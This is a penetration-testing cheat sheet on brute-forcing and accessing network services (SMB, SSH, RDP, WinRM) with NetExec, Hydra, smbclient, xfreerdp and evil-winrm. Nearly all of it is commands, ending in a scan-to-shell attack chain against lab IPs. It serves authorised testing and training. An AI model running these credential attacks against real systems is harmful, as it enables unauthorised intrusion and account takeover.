
# 🌐 Network Services – Command Cheat Sheet (NetExec, Hydra, SMB, SSH, RDP, WinRM)

---

> [!info] 🧠 Overview of Network Services
>
> Common attackable services during pentests:
>
> ```text
> FTP, SMB, NFS, IMAP/POP3, SSH, MySQL/MSSQL, RDP, WinRM, VNC, Telnet, SMTP, LDAP
> ```
>
> 💡 Most support authentication → usernames + passwords (or hashes/keys)

---

# ⚙️ NetExec (nxc) Cheat Sheet

---

> [!info] 🧩 Basic Syntax
>
> ```bash
> netexec <protocol> <target> -u <user> -p <password>
> ```
>
> **Example**
>
> ```bash
> netexec winrm 10.10.10.10 -u user.list -p pass.list
> ```

---

> [!tip] ⚡ Install NetExec
>
> ```bash
> sudo apt-get -y install netexec
> ```

---

> [!info] 🧠 General Options
>
> ```bash
> -t THREADS           # parallel threads
> --timeout SECONDS    # request timeout
> --jitter INTERVAL    # random delay between logins
> --no-progress        # disable progress bar
> --log file.txt       # save output
> --verbose            # detailed output
> --debug              # debug mode
> ```

---

> [!tip] 🌐 DNS Options
>
> ```bash
> -6                    # force IPv6
> --dns-server IP
> --dns-tcp
> --dns-timeout SEC
> ```

---

> [!info] 🔐 Supported Protocols
>
> ```text
> smb, winrm, ssh, ftp, rdp, mssql, ldap, vnc, wmi, nfs
> ```

---

> [!success] 🧨 SMB Example Attack
>
> ```bash
> netexec smb 10.10.10.10 -u user.list -p pass.list
> ```

---

> [!success] ⚡ WinRM Attack Example
>
> ```bash
> netexec winrm 10.10.10.10 -u user.list -p pass.list
> ```
>
> 💡 Look for:
>
> ```text
> (Pwn3d!)
> ```
>
> → indicates remote command execution possible

---

> [!tip] 📁 SMB Share Enumeration
>
> ```bash
> netexec smb 10.10.10.10 -u user -p pass --shares
> ```

---

# 🔥 Hydra Cheat Sheet (Bruteforce Tool)

---

> [!info] 🧩 General Syntax
>
> ```bash
> hydra -L users.txt -P passwords.txt <service>://<IP>
> ```

---

> [!tip] 🔐 SSH Bruteforce
>
> ```bash
> hydra -L users.txt -P passwords.txt ssh://10.10.10.10
> ```

---

> [!tip] 🪟 RDP Bruteforce
>
> ```bash
> hydra -L users.txt -P passwords.txt rdp://10.10.10.10
> ```

---

> [!tip] 📁 SMB Bruteforce
>
> ```bash
> hydra -L users.txt -P passwords.txt smb://10.10.10.10
> ```

---

> [!warning] ⚠️ Hydra Notes
>
> * SMBv3 may break older Hydra versions
> * Reduce threads if unstable:
>
>   ```bash
>   -t 1 or -t 4
>   ```

---

# 🔑 SSH Cheat Sheet

---

> [!info] 🔐 Connect via SSH
>
> ```bash
> ssh user@10.10.10.10
> ```

---

> [!tip] 💣 SSH Bruteforce (Hydra)
>
> ```bash
> hydra -L users.txt -P passwords.txt ssh://IP
> ```

---

# 🪟 RDP Cheat Sheet

---

> [!info] 🔐 Connect via xfreerdp
>
> ```bash
> xfreerdp /v:IP /u:user /p:password
> ```

---

> [!tip] 💣 RDP Bruteforce
>
> ```bash
> hydra -L users.txt -P passwords.txt rdp://IP
> ```

---

# 🧷 WinRM Cheat Sheet

---

> [!info] 🔐 Connect via Evil-WinRM
>
> ```bash
> evil-winrm -i IP -u user -p password
> ```

---

> [!tip] 💣 WinRM Bruteforce (NetExec)
>
> ```bash
> netexec winrm IP -u users.txt -p passwords.txt
> ```

---

# 🗂️ SMB Cheat Sheet

---

> [!info] 🔍 Enumerate Shares
>
> ```bash
> netexec smb IP -u user -p pass --shares
> ```

---

> [!tip] 📁 Connect to SMB Share
>
> ```bash
> smbclient -U user \\\\IP\\SHARE
> ```

---

> [!tip] 💣 SMB Bruteforce (Hydra)
>
> ```bash
> hydra -L users.txt -P passwords.txt smb://IP
> ```

---

# 🧠 Mental Model (Very Important)

> [!quote] 🎯 Think Like This
>
> ```text
> Service → Port → Credentials → Tool → Access
> ```
>
> Example flow:
>
> ```text
> SMB (445) → netexec → valid creds → smbclient → file access
> SSH (22) → hydra → creds → ssh login
> RDP (3389) → xfreerdp → desktop access
> WinRM (5985) → evil-winrm → PowerShell shell
> ```

---

# 🚀 Real Workflow Example

---

> [!success] 🧨 Full Attack Chain
>
> ```bash
> nmap -p 22,445,3389,5985 IP
> ```
>
> ```bash
> netexec smb IP -u users.txt -p pass.txt
> ```
>
> ```bash
> netexec winrm IP -u user -p pass
> ```
>
> ```bash
> evil-winrm -i IP -u user -p pass
> ```

---

